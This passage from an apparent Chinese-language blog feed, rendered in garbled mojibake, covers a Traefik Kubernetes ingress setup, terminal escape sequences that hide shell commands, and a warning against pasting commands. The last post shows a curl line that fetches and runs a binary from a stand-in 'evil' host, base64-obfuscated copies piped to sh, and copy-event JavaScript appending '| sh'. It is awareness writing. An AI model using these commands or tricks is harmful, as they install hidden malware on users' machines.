class="attr">      labels:</span></span><br><span class="line"><span class="attr">        app:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">    spec:</span></span><br><span class="line"><span class="attr">      serviceAccountName:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"><span class="attr">      containers:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">          image:</span> <span class="attr">traefik:v2.2</span></span><br><span class="line"><span class="attr">          args:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--api.insecure</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--accesslog</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--entrypoints.web.Address=:8000</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--providers.kubernetesingress</span></span><br><span class="line"><span class="bullet">            -</span> <span class="bullet">--providers.kubernetescrd</span></span><br><span class="line"><span class="attr">          ports:</span></span><br><span class="line"><span class="attr">            - name:</span> <span class="string">web</span></span><br><span class="line"><span class="attr">              containerPort:</span> <span class="number">8000</span></span><br><span class="line"><span class="attr">            - name:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">              containerPort:</span> <span class="number">8080</span></span><br></pre></td></tr></tbody></table></figure><p>ç‚º Traefik è¨­å®š Serviceï¼š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  ports:</span></span><br><span class="line"><span class="attr">    - protocol:</span> <span class="string">TCP</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">web</span></span><br><span class="line"><span class="attr">      port:</span> <span class="number">8000</span></span><br><span class="line"><span class="attr">    - protocol:</span> <span class="string">TCP</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">admin</span></span><br><span class="line"><span class="attr">      port:</span> <span class="number">8080</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">traefik</span></span><br></pre></td></tr></tbody></table></figure><p>å»ºç«‹ Ingress èˆ‡ Middleware(stripprefix)ï¼š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">yy-ingress</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">traefik.ingress.kubernetes.io/router.entrypoints:</span> <span class="string">web</span></span><br><span class="line">    <span class="string">traefik.ingress.kubernetes.io/router.middlewares:</span> <span class="string">default-stripprefix@kubernetescrd</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  rules:</span></span><br><span class="line"><span class="attr">  - host:</span> <span class="string">yy.k8s</span></span><br><span class="line"><span class="attr">    http:</span></span><br><span class="line"><span class="attr">      paths:</span></span><br><span class="line"><span class="attr">      - path:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">        backend:</span></span><br><span class="line"><span class="attr">          serviceName:</span> <span class="string">whales</span></span><br><span class="line"><span class="attr">          servicePort:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">      - path:</span> <span class="string">/app</span></span><br><span class="line"><span class="attr">        backend:</span></span><br><span class="line"><span class="attr">          serviceName:</span> <span class="string">whales</span></span><br><span class="line"><span class="attr">          servicePort:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">      - path:</span> <span class="string">/whoami</span></span><br><span class="line"><span class="attr">        backend:</span></span><br><span class="line"><span class="attr">          serviceName:</span> <span class="string">whoami</span></span><br><span class="line"><span class="attr">          servicePort:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">  - host:</span> <span class="string">admin.yy.k8s</span></span><br><span class="line"><span class="attr">    http:</span></span><br><span class="line"><span class="attr">      paths:</span></span><br><span class="line"><span class="attr">        - path:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">          backend:</span></span><br><span class="line"><span class="attr">            serviceName:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">            servicePort:</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">traefik.containo.us/v1alpha1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Middleware</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">stripprefix</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  stripPrefix:</span></span><br><span class="line"><span class="attr">    prefixes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/app</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/whoami</span></span><br></pre></td></tr></tbody></table></figure><p>è¦æ³¨æ„çš„é‡é»æœ‰ï¼š</p><ul><li>CRD ä¸­çš„æ¬Šé™è¦è¨˜å¾— middwares æœ‰è¢«åŠ é€²å»ã€‚</li><li>è¦ä½¿ç”¨ Ingressï¼ŒTraefik è·‘èµ·ä¾†æ™‚è¦åŠ ä¸Š <code>--providers.kubernetesingress</code></li><li>å¦‚æœç”¨ IngressRoute è·‘ï¼Œè¦åŠ ä¸Š <code>--providers.kubernetescrd</code></li><li>annotations ä¸­ middleware çš„åå­—æœ€å‰é¢éœ€è¦åŠ ä¸Š namespaceï¼ˆæœ¬æ–‡ä½¿ç”¨ defaultï¼‰</li><li>å¦‚æœç›´æ¥è²¼ Traefik å®˜ç¶²çš„ user-guides/crd-acmeï¼Œè¦æ³¨æ„å®ƒä¸¦æ²’æœ‰åŠ ä¸Š <code>--providers.kubernetesingress</code>ï¼Œæ‰€ä»¥ç„¡æ³•èˆ‡ Ingress æ­£ç¢ºç¶å®š</li><li>åœ¨ local æ¸¬è©¦å¯ä»¥ç”¨ <code>kubectl port-forward svc/traefik foo-port:8080</code> é€£åˆ° dashboard ä¾† debug</li></ul><p>æ›´å¤šè©³ç´°è¨­å®šå¯ä»¥åƒè€ƒ <a href="https://docs.traefik.io/user-guides/crd-acme/#ingressroute-definition" target="_blank" rel="noopener">user-guides/crd-acme</a>ï¼Œä»¥ä¸Šçš„è¨­å®šæ¯”è¼ƒç²¾ç°¡ï¼Œæ­¤æ–‡ç« åªæœ‰ç•™å¿…è¦éƒ¨åˆ†è€Œå·²ã€‚</p><p>å®Œæ•´çš„è¨­å®šå¯ä»¥åˆ° <a href="https://github.com/yiyu0x/k8s-traefik-example" target="_blank" rel="noopener">GitHub Repo</a> ä¸Šé¢çœ‹ã€‚</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>çœ¼è¦‹ç‚ºæ†‘ï¼Ÿåˆ©ç”¨çµ‚ç«¯æ©Ÿç‰¹æ€§è—åŒ¿æƒ¡æ„æŒ‡ä»¤</title>
    <link href="https://blog.yiyu0x.org/2020/04/29/"/>
    <id>https://blog.yiyu0x.org/2020/04/29/</id>
    <published>2020-04-29T06:19:30.000Z</published>
    <updated>2025-04-12T20:59:43.596Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å°æ–¼ Linux ä½¿ç”¨è€…æˆ–æ˜¯è»Ÿé«”å·¥ç¨‹å¸«ä¾†èªªï¼Œçµ‚ç«¯æ©Ÿæ˜¯æ¯å¤©å¿…é ˆç”¨åˆ°çš„è»Ÿé«”ä¹‹ä¸€ã€‚å°¤å…¶æ˜¯é‚£äº›æ³¨é‡é–‹ç™¼æ•ˆç‡ä»¥åŠæœ‰åœ¨ç¶­è­·ä¼ºæœå™¨çš„å·¥ç¨‹å¸«ä¾†èªªï¼Œæˆ‘å€‘éƒ½ä¸å¸Œæœ›é›™æ‰‹é›¢é–‹éµç›¤ï¼Œåˆ†æ•£æ³¨æ„åŠ›ã€‚é€™ç¨®æƒ…æ³ä¸‹ï¼Œç•¶æˆ‘å€‘è¦ç¨å¾®æª¢è¦–æª”æ¡ˆå…§å®¹æ™‚ï¼Œæœƒä½¿ç”¨åˆ°ä»¥ä¸‹å¹¾å€‹å¸¸ç”¨çš„å·¥å…·ï¼š</p><ul><li>cat</li><li>less</li><li>more</li><li>vim</li></ul><p>ç„¶è€Œæˆ‘å€‘é€éå·¥å…·æ‰€çœ‹åˆ°çš„æª”æ¡ˆå…§å®¹ï¼Œå¯ä»¥å®Œå…¨ç›¸ä¿¡å—ï¼Ÿ</p><h2 id="çœ¼è¦‹ç‚ºæ†‘ï¼Ÿ"><a href="#çœ¼è¦‹ç‚ºæ†‘ï¼Ÿ" class="headerlink" title="çœ¼è¦‹ç‚ºæ†‘ï¼Ÿ"></a>çœ¼è¦‹ç‚ºæ†‘ï¼Ÿ</h2><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><script type="text/javascript" src="https://asciinema.org/a/325079.js" id="asciicast-325079" async></script><p>çœ‹éä¸Šè¿°ä¾‹å­ä¹‹å¾Œï¼Œä½ é‚„æ•¢åªç”¨ <code>cat</code> ç¢ºèªæª”æ¡ˆå…§å®¹å—ï¼Ÿ</p><p>ç‚ºä½•æœƒç™¼ç”Ÿé€™ç¨®äº‹ï¼ŸåŸå› åœ¨æ–¼çµ‚ç«¯æ©Ÿæœ¬èº«å°±æœƒè¾¨èªå¹¾å€‹å…·æœ‰æ„ç¾©çš„ç‰¹æ®Šå­—å…ƒï¼Œä½ å¯èƒ½ç”¨éä¸€äº›ç‰¹åˆ¥çš„å·¥å…·å¯ä»¥è®“çµ‚ç«¯æ©Ÿå°å‡ºæœ‰é¡è‰²çš„å­—ï¼Œå°±æ˜¯åˆ©ç”¨åˆ°é€™ç¨®ç‰¹æ€§ã€‚</p><p>é‚£é€™äº›ç‰¹æ®Šå­—å…ƒå¯ä»¥æ“ä½œçµ‚ç«¯æ©Ÿçš„å“ªäº›è¡Œç‚ºå‘¢ï¼Ÿ</p><ul><li>ç§»å‹•æ¸¸æ¨™åˆ°ä»»æ„ä½ç½®</li><li>åˆªé™¤ä»»æ„å°å‡ºçš„å­—å…ƒ</li><li>æ“ä½œçµ‚ç«¯æ©Ÿè¦–çª—</li><li>å°‡ä¸åŒæŒ‰éµå°æ‡‰åˆ°çš„çµ‚ç«¯æ©Ÿè¡Œç‚ºé€²è¡Œè¦†å¯«</li></ul><p>ä¸Šè¿°ç¯„ä¾‹ï¼Œå°±æ˜¯é€éç§»å‹•çµ‚ç«¯æ©Ÿæ¸¸æ¨™ï¼Œè®“å…©è¡ŒæŒ‡ä»¤éƒ½å°åœ¨åŒä¸€å€‹ä½ç½®ä¸Šï¼ˆä½ç½®é‡ç–Šï¼Œåªæœƒé¡¯ç¤ºè¦†è“‹çš„æŒ‡ä»¤ï¼‰ï¼Œå¦‚æ­¤ä¸€ä¾†å°±å¯ä»¥éš±è—è¢«è¦†è“‹çš„æŒ‡ä»¤ã€‚</p><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>æˆ‘å€‘æ› <code>curl -s</code> è©¦è©¦</p><script type="text/javascript" src="https://asciinema.org/a/325095.js" id="asciicast-325095" async></script><p>çœ‹å®Œé€™å€‹ä¾‹å­ä¹‹å¾Œï¼Œæˆ‘ç›¸ä¿¡ä½ å†ä¹Ÿä¸æ•¢ç›¸ä¿¡è‚‰çœ¼çœ‹åˆ°çš„å…§å®¹ã€‚</p><h3 id="çµè«–"><a href="#çµè«–" class="headerlink" title="çµè«–"></a>çµè«–</h3><p>å¦‚æœè¦ç¢ºèªæª”æ¡ˆçš„å…§å®¹æƒ³è¦ç”¨ <code>cat</code> çš„è©±ï¼Œå¯ä»¥åŠ ä¸Šåƒæ•¸ <code>v</code>ï¼Œé¡¯ç¤ºä¸å¯è¦–å­—å…ƒã€‚</p><p>ä»¥ç¬¬ä¸€å€‹ä¾‹å­ä¾†èªªï¼š<code>cat -v script.sh</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"evil!"</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!"</span></span><br></pre></td></tr></tbody></table></figure><p><code>^[[2A</code> å°±æ˜¯å‘Šè¨´çµ‚ç«¯æ©Ÿå°‡æ¸¸æ¨™å¾€ä¸Šç§»å‹•å…©è¡Œï¼Œç¹¼çºŒå¾è©²ä½ç½®å°å‡ºï¼ˆè¦†è“‹åŸæœ¬çš„ echo â€œevil!â€ï¼‰ã€‚</p><p>å¯ä»¥çš„è©±ï¼Œé‚„æ˜¯å»ºè­°ä½¿ç”¨æ–‡å­—ç·¨è¼¯å™¨æ‰“é–‹ç¢ºèªå…§å®¹æœƒæ¯”èµ·ç›´æ¥å°å‡ºå…§å®¹åœ¨çµ‚ç«¯æ©Ÿä¾†å¾—å¯ä¿¡ã€‚</p><p>å¦‚æœæƒ³è¦è‡ªå·±æ¸¬è©¦çš„è©±å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">'#!/bin/sh\n\necho "evil!"\nexit 0\n\033[2Aecho "Hello World!"\n'</span> > script.sh</span><br><span class="line">chmod a+x script.sh</span><br></pre></td></tr></tbody></table></figure><p>æˆ–æ˜¯ä½ æƒ³æ·±å…¥äº†è§£çµ‚ç«¯æ©Ÿæ§åˆ¶å­—å…ƒä»¥åŠä¸åŒçµ‚ç«¯æ©Ÿçš„ç‹€æ³å¯ä»¥åƒè€ƒ <a href="https://www.infosecmatter.com/terminal-escape-injection/#what-are-the-escape-sequences" target="_blank" rel="noopener">Terminal Escape Injection</a>ã€‚</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="è³‡è¨Šå®‰å…¨" scheme="https://blog.yiyu0x.org/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>å¾é§­å®¢è§’åº¦å‘Šè¨´ä½ ç‚ºä½•ä¸è¦éš¨æ„è¤‡è£½æŒ‡ä»¤</title>
    <link href="https://blog.yiyu0x.org/2020/03/16/"/>
    <id>https://blog.yiyu0x.org/2020/03/16/</id>
    <published>2020-03-16T03:13:36.000Z</published>
    <updated>2025-04-12T20:59:43.594Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>ç›¸ä¿¡å¾ˆå¤šäººéƒ½æœ‰é€™æ¨£çš„ç¶“é©—ï¼Œä¸‹æŒ‡ä»¤æ™‚ç”¢ç”ŸæŸæŸéŒ¯èª¤ã€‚é€™å€‹éŒ¯èª¤å¯èƒ½æ²’è¦‹éï¼Œä¹Ÿå¯èƒ½æ˜¯ä¹‹å‰é‡éä½†æ˜¯å¿˜è¨˜æ€éº¼è§£ã€‚ä½†æˆ‘å€‘åªè¦å°‡éŒ¯èª¤è¤‡è£½èµ·ä¾†ï¼Œè²¼ä¸Šæœå°‹å¼•æ“ï¼Œé¦¬ä¸Šå°±æœƒè·³å‡ºå„ç¨®ç¶²é å¯ä»¥åƒè€ƒï¼Œç„¡å€«æ˜¯çŸ¥åçš„ç¨‹å¼è¨è«–è«–å£‡ï¼Œæˆ–è‘—æ˜¯å®˜æ–¹æ–‡ä»¶ï¼Œåˆæˆ–è‘—æ˜¯å€‹äººè‡ªè¡Œæ¶è¨­çš„éƒ¨è½æ ¼ã€‚çœ‹åˆ°æŒ‡ä»¤å°±è²¼ä¸Šé€™å€‹ç¿’æ…£ï¼Œæ˜¯é–‹ç™¼è€…çš„çœ¾å¤šå£ç¿’æ…£ä¹‹ä¸€ã€‚</p><p>é§­å®¢å¯ä»¥å¾ˆå·§å¦™çš„åˆ©ç”¨é€™ä¸€é»ï¼Œå°‡ç²¾å¿ƒè£½ä½œçš„å¾Œé–€ç¨‹å¼ï¼ˆæˆ–å…¶ä»–æƒ¡æ„ç¨‹å¼ï¼‰ï¼Œé€éåŒ…è£ï¼Œèª˜é¨™å—å®³è€…ï¼ˆå¯èƒ½å°±æ˜¯ä½ ï¼‰å»åŸ·è¡Œã€‚</p><h2 id="ç”Ÿç”¢æƒ¡æ„æŒ‡ä»¤"><a href="#ç”Ÿç”¢æƒ¡æ„æŒ‡ä»¤" class="headerlink" title="ç”Ÿç”¢æƒ¡æ„æŒ‡ä»¤"></a>ç”Ÿç”¢æƒ¡æ„æŒ‡ä»¤</h2><p>å‡å¦‚ä»Šå¤©æˆ‘æƒ³è¦è®“å—å®³è€…çš„é›»è…¦åŸ·è¡Œä¸€æ¢æŒ‡ä»¤å°±è¢«æ¤å…¥å¾Œé–€ï¼Œæˆ‘æœƒé€™éº¼åšï¼š</p><p><code>curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</code></p><p>é¦–å…ˆå…ˆé€é <code>curl</code> ä¸‹è¼‰é ç«¯ç·¨è­¯å¥½çš„æƒ¡æ„ç¨‹å¼ï¼Œä¸¦ä¸”çµ¦äºˆè©²ç¨‹å¼åŸ·è¡Œæ¬Šé™ï¼Œç„¶å¾ŒåŸ·è¡Œï¼Œæœ€å¾Œåˆªé™¤ï¼ˆåŒ¿è¹¤ï¼‰ã€‚</p><p>ä½†é€™ç¨®æŒ‡ä»¤æˆ‘æƒ³æ‡‰è©²æ²’æœ‰äººæœƒç›´æ¥è²¼ä¸ŠåŸ·è¡Œï¼Œä¸ä½†æ„åœ–æ˜é¡¯ï¼Œè€Œä¸”é‚„ç›´æ¥å‘Šè¨´å—å®³è€…ï¼šã€Œæˆ‘æ‰“ç®—ä¸‹è¼‰ä¾†è·¯ä¸åçš„æª”æ¡ˆï¼Œè€Œä¸”è¦åŸ·è¡Œå®ƒã€ã€‚</p><h2 id="å½è£"><a href="#å½è£" class="headerlink" title="å½è£"></a>å½è£</h2><p>æƒ³è¦å½è£é€šå¸¸æˆ‘å€‘æœƒå°‡æŒ‡ä»¤åŒ…è£¹æˆå…¶ä»–æ„åœ–ï¼Œé€éç°¡å–®çš„ç·¨ç¢¼ä¾†å°‡é€™å€‹æƒ¡æ„æŒ‡ä»¤é€²è¡Œç·¨ç¢¼ï¼Œä»¥ä¸‹é¸ç”¨ base64 é€²è¡Œç·¨ç¢¼ï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==</span><br></pre></td></tr></tbody></table></figure><p>ç‚ºä½•é¸æ“‡ä½¿ç”¨ <code>base64</code>ï¼ŒåŸå› æ˜¯å› ç‚º Linux å…§å»ºå°±æœ‰ base64 å·¥å…·ï¼Œå—å®³äººå¯ä»¥é€éåŸ·è¡Œ base64 è§£ç¢¼å·¥å…·ï¼Œè§£å‡ºå…·æœ‰æ„ç¾©çš„å­—ä¸²</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d</span><br></pre></td></tr></tbody></table></figure><p>output:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</span><br></pre></td></tr></tbody></table></figure><p>æ¥è‘—å°‡å­—ä¸² pipe åˆ° <code>sh</code> å°±å¯ä»¥ç›´æ¥é‹è¡Œï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure><p>ä»¥ä¸ŠæŒ‡ä»¤å°±æ²’æœ‰è¾¦æ³•ä¸€çœ¼å°±çœ‹å‡ºç›®çš„ï¼Œä½†æ„åœ–ä¸è®Šã€‚</p><h2 id="é€²ä¸€æ­¥å½è£"><a href="#é€²ä¸€æ­¥å½è£" class="headerlink" title="é€²ä¸€æ­¥å½è£"></a>é€²ä¸€æ­¥å½è£</h2><p>æœ‰ç¶“é©—çš„é–‹ç™¼è€…çœ‹åˆ°æŒ‡ä»¤ä¸­å¸¶æœ‰ <code>sh</code> å°±æœƒé¦¬ä¸Šèµ·ç–‘å¿ƒï¼Œé€™æ˜¯ä¸€ä»¶å¥½äº‹ã€‚å› ç‚ºæœ¬ä¾†å°±ä¸æ‡‰è©²éš¨ä¾¿ä¸‹å…·æœ‰åŸ·è¡Œæ¬Šé™çš„æŒ‡ä»¤ï¼Œä½•æ³ä½ æ ¹æœ¬ä¸çŸ¥é“é‚£ä¸² <code>base64</code> å­—ä¸²è§£å‡ºä¾†ç‚ºä½•ã€‚</p><p>æˆ‘å€‘å¯ä»¥å…ˆå°‡æˆ‘å€‘çš„æƒ¡æ„æŒ‡ä»¤å¤šæ–°å¢ä¸€å€‹åŠŸèƒ½ï¼Œå°å‡ºä¸€äº›å­—ä¸²ï¼Œè®“å—å®³è€…ä»¥ç‚ºé€™ä¸² <code>base64</code> å°±æ˜¯ä¸€å€‹æ™®é€šçš„å­—ä¸²è€Œå·²ï¼š</p><p><code>echo "Hi, Im yiyu0x :)" && curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</code></p><p>é€²è¡Œç·¨ç¢¼ï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==</span><br></pre></td></tr></tbody></table></figure><p>æƒ¡æ„æŒ‡ä»¤ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure><p>åŸ·è¡Œå¾Œçš„çµæœï¼š</p><p><code>Hi, Im yiyu0x :)</code></p><p>å¦‚æœæˆ‘å°‡å€‹æŒ‡ä»¤æ”¾åœ¨ä¸€äº›é¡¯çœ¼çš„åœ°æ–¹åƒæ˜¯ç¶²ç«™çš„è‡ªæˆ‘ä»‹ç´¹ã€èªªæ˜æ¬„ï¼Œæˆ‘ç›¸ä¿¡æœ‰äº›å…·æœ‰å¥½å¥‡å¿ƒçš„è®€è€…å¯èƒ½å°±æœƒå‚»å‚»åŸ·è¡Œã€‚ä½†æ˜¯ä¸€äº›å…·æœ‰ç¶“é©—çš„è®€è€…é‚„æ˜¯æœƒç™¼ç¾å¥å°¾å¸¶çš„é‚£å€‹ <code>sh</code>ï¼Œè€Œä¸å»åŸ·è¡Œå®ƒã€‚</p><p>é‚£æˆ‘å¦‚æœæ”¹æˆé€™æ¨£å‘¢ï¼Ÿ</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d</span><br></pre></td></tr></tbody></table></figure><p>é€™æ¨£å­æˆ‘ç›¸ä¿¡ 9 æˆä»¥ä¸Šçš„äººï¼ˆåŒ…å«æˆ‘è‡ªå·±ï¼‰ï¼Œéƒ½æœƒæƒ³æŠŠé€™æ®µæŒ‡ä»¤è²¼ä¸Šå»åŸ·è¡Œçœ‹ä¸€ä¸‹çµæœç‚ºä½•ï¼Œç•¢ç«Ÿå°±æ˜¯ä¸€æ¢å–®ç´”çš„è§£ç¢¼æŒ‡ä»¤ï¼Œæ€éº¼å¯èƒ½æœ‰å®³ï¼Ÿ</p><p>ä½†æ˜¯åˆ¥å¿˜äº†ï¼Œæƒ¡æ„æ”»æ“Šè€…å¯ä»¥åœ¨ç¶²é ä¸­çš„ JS æ’å…¥ï¼š</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> source = <span class="built_in">document</span>.querySelector(<span class="string">'div.source'</span>) <span class="comment">//æŒ‡ä»¤å€å¡Š</span></span><br><span class="line">source.addEventListener(<span class="string">'copy'</span>, (event) => {</span><br><span class="line">    <span class="keyword">const</span> selection = <span class="built_in">document</span>.getSelection()</span><br><span class="line">    event.clipboardData.setData(<span class="string">'text/plain'</span>, selection.toString() + <span class="string">'| sh'</span>)</span><br><span class="line">    event.preventDefault()</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>è©²ç¨‹å¼ç¢¼çš„æ„æ€ç‚ºç•¶ä½ è¤‡è£½å­—ä¸²æ™‚ï¼Œè‡ªå‹•å°‡å‰ªè²¼æ¿ä¸­çš„å­—ä¸²æœ«ç«¯åŠ ä¸Š <code>| sh</code>ï¼Œæ„æ€å°±æ˜¯ä½ è¤‡è£½åˆ°çš„å­—ä¸²å…¶å¯¦æ˜¯ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure><p>å¦‚æœä½ è²¼ä¸Š terminal ä¹‹å¾Œæ²’æœ‰æª¢æŸ¥å°±ç›´æ¥æŒ‰ä¸‹ enterï¼Œé‚£éº¼ä½ çš„é›»è…¦å°±ä¸çŸ¥ä¸è¦ºçš„åŸ·è¡Œäº†ä¸€å€‹åŸ·è¡Œæª”è€Œä½ 